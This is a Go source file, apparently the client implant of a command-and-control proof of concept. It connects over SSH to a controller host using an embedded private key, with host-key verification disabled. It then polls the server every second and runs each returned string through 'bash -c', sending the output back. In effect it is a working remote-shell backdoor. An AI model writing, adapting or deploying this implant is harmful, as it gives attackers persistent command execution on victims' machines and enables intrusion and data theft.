// Heavily borrowed code for proof of concept, will be changing
package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"time"

	"os/user"

	"github.com/0x42red/command_control/pkg/embeddata"
	"github.com/melbahja/goph"
	"golang.org/x/crypto/ssh"
)

var (
	addr    string
	port    uint
	timeout time.Duration
)

func init() {
	config, err := embeddata.GetConfig()
	if err != nil {
		log.Fatal(err)
	}
	flag.StringVar(&addr, "ip", config.Host, "machine ip address.")
	flag.UintVar(&port, "port", uint(config.Port), "ssh port number.")
	flag.DurationVar(&timeout, "timeout", 0, "interrupt a command with SIGINT after a given timeout (0 means no timeout)")
}

func VerifyHost(host string, remote net.Addr, key ssh.PublicKey) error {
	return nil
	// //
	// // If you want to connect to new hosts.
	// // here your should check new connections public keys
	// // if the key not trusted you shuld return an error
	// //

	// // hostFound: is host in known hosts file.
	// // err: error if key not in known hosts file OR host in known hosts file but key changed!
	// hostFound, err := goph.CheckKnownHost(host, remote, key, "")

	// // Host in known hosts but key mismatch!
	// // Maybe because of MAN IN THE MIDDLE ATTACK!
	// if hostFound && err != nil {

	// 	return err
	// }

	// // handshake because public key already exists.
	// if hostFound && err == nil {

	// 	return nil
	// }

	// // // Ask user to check if he trust the host public key.
	// // if askIsHostTrusted(host, key) == false {

	// // 	// Make sure to return error on non trusted keys.
	// // 	return errors.New("you typed no, aborted!")
	// // }

	// // Add the new host to known hosts file.
	// return goph.AddKnownHost(host, remote, key, "")
}

func main() {

	flag.Parse()

	var err error

	signer, err := embeddata.GetPrivateKey()
	if err != nil {
		panic(err)
	}

	auth := goph.Auth{
		ssh.PublicKeys(signer),
	}

	fmt.Println(signer.PublicKey())

	currentUser, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}

	client, err := goph.NewConn(&goph.Config{
		User:     currentUser.Username,
		Addr:     addr,
		Port:     port,
		Auth:     auth,
		Callback: VerifyHost,
	})

	if err != nil {
		panic(err)
	}
	defer client.Close()

	handleConnection(client)

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
	<-c
}

func handleConnection(client *goph.Client) {

	fmt.Printf("Connected to %s:%d\n", client.Config.Addr, client.Config.Port)

	ticker := time.NewTicker(1000 * time.Millisecond)
	done := make(chan bool)
	go func() {
		for {
			select {
			case <-done:
				return
			case <-ticker.C:
				command, err := client.Command("POLL")
				if err != nil {
					fmt.Println(err)
					continue
				}
				out, err := command.Output()
				if err != nil {
					fmt.Println(err)
					continue
				}
				if strings.TrimSpace(string(out)) != "" {
					fmt.Println(string(out), err)
					exec.Command("bash", "-c", string(out))
					out, err = exec.Command("bash", "-c", string(out)).CombinedOutput()
					if err != nil {
						fmt.Println(err)
						out = append(out, []byte(err.Error())...)
					}

					command, err = client.Command(string(out))
					if err != nil {
						fmt.Println(err)
						continue
					}
					out, err = command.CombinedOutput()
					if err != nil {
						fmt.Println(err)
						continue
					}
					fmt.Println(string(out), err)
				}
			}
		}
	}()
}
